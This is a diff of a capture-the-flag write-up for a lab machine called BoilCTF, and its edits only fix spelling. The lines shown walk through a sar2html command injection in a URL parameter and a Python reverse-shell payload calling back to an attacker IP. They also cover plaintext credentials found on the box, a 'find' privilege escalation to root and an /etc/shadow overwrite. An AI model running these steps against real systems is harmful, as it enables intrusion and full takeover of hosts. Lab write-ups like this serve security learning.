@@ -1,7 +1,7 @@
 # BoilCTF
 IP: 10.10.8.187
 <br>
-First of all went to the ip in the browser and found apache2 server running. Then I went to robot.txt and found some interesting stuff there:
+First of all went to the IP in the browser and found the apache2 server running. Then I went to robot.txt and found some interesting stuff there:
 
 ```
 User-agent: *
@@ -33,7 +33,7 @@ MYSQL_DATABASE: joomla_ut
      MYSQL_ROOT_PASSWORD: joomla_ut
 ```
 
-I even tried to use Joomla scaner, but didn't find anything useful.
+I even tried to use Joomla Scanner, but didn't find anything useful.
 ```
 Joomla version is: 3.9.12
 
@@ -51,24 +51,24 @@ none/
 tinymce/
 ```
 
-After some time, I realized that I need another tactic. I remembered that there was some weird thing on the _\_test_ page. So I went there. 
+:bulb: After some time, I realized that I needed another tactic. I remembered that there was some weird thing on the _\_test_ page. So I went there. 
 ![sar2html](./imgs/sar2html.png)
 Then I googled sar2html exploit and found what I needed. It turns out that to exploit the thing we just need to change the url a little bit.<br>
-This is a good url which supposed to give us something whatever.<br>
+This is a good URL which supposed to give us something whatever.<br>
 http://boilctf.thm/joomla/_test/index.php?plot=LINUX<br>
 But if we change it to:
 http://boilctf.thm/joomla/_test/index.php?plot=;whoami and click on the Select Host button<br>
-we get some additional result there, which is a response to our command:
+we get some additional results there, which is a response to our command:
 ![whoami](./imgs/whoami.png)
 
-I set up an _nc_ listener on port *2222* and used a simple python reverse-shell which I found on the internet. Therefore, eventually my url looked like this:<br>
+I set up an _nc_ listener on port *2222* and used a simple Python reverse-shell which I found on the internet. Therefore, eventually, my URL looked like this:<br>
 ```
 http://boilctf.thm/joomla/_test/index.php?plot=;python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.2.116.12",2222));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
 ```
 
-And at this point we got a reverse-shell. Here is the contents of the _log.txt_ file that was in the folder.
+And at this point, we got a reverse-shell. Here is the contents of the _log.txt_ file that was in the folder.
 ![log.txt](./imgs/log.txt.png)
-So we got usernames and password there.
+So we got usernames and passwords there.
 username: _basterd_<br>
 username: _pentest_<br>
 password: _superduperp@$$_<br>
@@ -83,12 +83,12 @@ I went to https://gtfobins.github.io/gtfobins/find/ and found that I can escalat
 ```
 find . -exec /bin/sh -p \; -quit
 ```
-So I excuted it and got root.
+So I executed it and got root.
 
 Even though that reverse-shell worked I wanted to connect via _ssh_ to the machine.
-ssh was not on port 22 it. Reading ssh config file (/etc/ssh/sshd_conf) found that it was running on port 55007.
+SSH was not on port 22. Reading the ssh config file (`/etc/ssh/sshd_conf`) found that it was running on port `55007`.
 
-Also I couldn't connect directly to root so I created my own hash of a password. And changed the `/etc/shadow` file a little bit.
+Also, I couldn't connect directly to root so I created my own hash of a password. And changed the `/etc/shadow` file a little bit.
 ```
 openssl passwd -6 -salt xyz yourpass
 $6$xyz$VKswtvLoVpOLcpjDMIFXhxa8ukqqKSKHjcPBLZUk9NxWldmlFQY4stUGo.QjEhav7mp86ih2PRqYPqjkhWi5y.
